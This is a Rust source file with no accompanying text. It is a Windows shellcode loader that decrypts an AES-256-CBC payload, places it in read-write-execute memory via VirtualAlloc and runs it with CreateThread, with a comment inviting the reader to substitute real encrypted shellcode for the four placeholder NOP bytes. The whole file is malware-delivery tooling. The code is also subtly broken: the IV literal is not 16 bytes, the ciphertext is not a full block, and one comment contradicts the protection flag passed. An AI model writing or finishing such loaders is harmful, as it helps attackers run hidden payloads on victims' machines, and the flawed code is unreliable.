use openssl::symm::{Cipher, Crypter, Mode};
use winapi::um::{
    memoryapi::{VirtualAlloc, VirtualProtect},
    processthreadsapi::CreateThread,
    winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
};

unsafe fn decrypt_data(data: &[u8], key: &[u8], iv: &[u8]) -> Vec<u8> {
    let cipher = Cipher::aes_256_cbc();
    let mut decryptor = Crypter::new(cipher, Mode::Decrypt, key, Some(iv)).expect("Failed to create decryptor");
    let mut plaintext = vec![0u8; data.len() + cipher.block_size()];
    let count = decryptor.update(data, &mut plaintext).expect("Decryption failed");
    let rest = decryptor.finalize(&mut plaintext[count..]).expect("Finalize decryption failed");
    plaintext.truncate(count + rest);
    plaintext
}

fn main() {
    unsafe {
        let key = b"32_byte_long_key_for_AES_256_CBC";
        let iv = b"16_byte_long_IV_here";

        // Dummy encrypted shellcode - normally this would be actual encrypted bytes
        let encrypted_shellcode = vec![0x90, 0x90, 0x90, 0x90];

        // Allocate executable memory
        let shellcode_ptr = VirtualAlloc(
            std::ptr::null_mut(),
            encrypted_shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        ) as *mut u8;

        // Decrypt shellcode
        let decrypted_shellcode = decrypt_data(&encrypted_shellcode, key, iv);

        // Copy decrypted shellcode into allocated executable memory
        std::ptr::copy_nonoverlapping(decrypted_shellcode.as_ptr(), shellcode_ptr, decrypted_shellcode.len());

        // Change memory protection to execute only
        let mut old_protect = 0;
        VirtualProtect(shellcode_ptr as _, decrypted_shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);

        // Create a thread to run the shellcode
        CreateThread(
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(shellcode_ptr)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );
    }
}
